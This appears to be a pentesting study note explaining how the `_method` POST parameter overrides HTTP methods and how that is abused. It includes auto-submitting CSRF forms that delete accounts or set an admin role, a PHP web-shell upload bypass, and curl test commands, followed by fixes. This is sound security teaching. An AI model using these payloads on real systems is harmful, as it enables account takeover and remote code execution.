---
tags: [vapt, http-headers, web, intermediate]
difficulty: intermediate
module: "03 - HTTP Headers"
topic: "03.24 _method (POST body) — REST Method Override"
---

# 03.24 — _method (POST Body Parameter)

## What is it?

`_method` is a POST body parameter (not a header) used by Rails, Laravel, Symfony, and other web frameworks to tunnel HTTP methods through HTML forms. HTML forms only natively support GET and POST, so `_method=DELETE` allows forms to issue DELETE/PUT/PATCH requests.

---

## Why This Exists

```
HTML FORM LIMITATION:
  <form method="GET">  ← only these two!
  <form method="POST">

To submit a DELETE or PUT from a form, Rails and others support:
  <form method="POST" action="/api/user/5">
    <input type="hidden" name="_method" value="DELETE">
    <input type="submit" value="Delete Account">
  </form>
  
  → Server receives POST but treats it as DELETE!
```

---

## Attack: CSRF via _method

```
HTML FORMS CAN SUBMIT CROSS-ORIGIN:
  <form method="POST" action="https://target.com/api/user/5">
    <input type="hidden" name="_method" value="DELETE">
  </form>
  <script>document.forms[0].submit()</script>
  
  → If no CSRF protection → victim's account deleted!
  → No preflight needed (it's a POST form)!

UPGRADE: Change to PUT for data modification:
  <form method="POST" action="https://target.com/api/user/5">
    <input type="hidden" name="_method" value="PUT">
    <input type="hidden" name="role" value="admin">
  </form>
```

---

## Chained Attack: File Upload via _method Bypass

```
SCENARIO: PUT /api/upload is blocked but POST is allowed.
  PUT /api/upload/shell.php → 403 Forbidden

BYPASS:
  POST /api/upload/shell.php
  _method=PUT&content=<?php system($_GET[cmd]); ?>
  
  → Server processes as PUT!
```

---

## Other Body Parameter Variants

```
_method=DELETE    → Rails, Laravel
method=DELETE     → some implementations  
_Method=DELETE    → capitalization variation
_http_method=DELETE → uncommon
```

---

## Testing

```bash
# Test _method override
curl -X POST https://target.com/api/user/1 \
  -d "_method=DELETE"

curl -X POST https://target.com/api/user/1 \
  -d "_method=PUT&role=admin"

# JSON body also sometimes works
curl -X POST https://target.com/api/user/1 \
  -H "Content-Type: application/json" \
  -d '{"_method":"DELETE"}'

# CSRF PoC:
cat > csrf.html << 'EOF'
<html>
<body>
  <form method="POST" action="https://TARGET.com/api/user/ME">
    <input name="_method" value="DELETE">
  </form>
  <script>document.forms[0].submit()</script>
</body>
</html>
EOF
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| CSRF via _method DELETE | Add CSRF tokens to all state-changing forms |
| Privilege escalation via _method PUT | Validate authorization against overridden method |
| SameSite=None cookies | Set SameSite=Strict or Lax |

---

## Related Notes
- [[22 - X-HTTP-Method-Override]] — header version of same attack
- [[23 - X-Method-Override]] — another variant
- [[Module 07 - CSRF]] — full CSRF exploitation
